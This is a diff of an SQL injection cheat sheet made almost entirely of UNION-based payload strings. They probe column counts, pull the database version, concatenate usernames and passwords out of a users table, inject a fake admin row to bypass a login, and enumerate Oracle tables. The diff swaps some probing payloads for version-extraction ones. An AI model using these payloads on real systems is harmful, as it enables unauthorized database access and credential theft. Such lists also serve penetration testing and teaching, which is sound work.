@@ -186,17 +186,12 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2    --- Basic usage, must b
 ' UNION SELECT 1,2,3--
 ' UNION SELECT 1,2,3,4--
 ' UNION SELECT NULL FROM DUAL--            Oracle specific, SELECT must use FROM query
---- Find columns with useful data type
-' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
-' UNION SELECT NULL,NULL,'a',NULL--
-' UNION SELECT NULL,NULL,NULL,'a'--
-' UNION SELECT username,2--
-' UNION SELECT username,2,3--
-' UNION SELECT username,2,3,4--
+
+--- Location of injection matters
+' UNION SELECT NULL,@@version,NULL,NULL--
+' UNION SELECT 1,@@version,3,4--
 --- retrieve multiple values within a single column
 ' UNION SELECT username || ':' || password FROM users--
-
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 ' order by 3--
 ' union select null,table_name,null from all_tables--
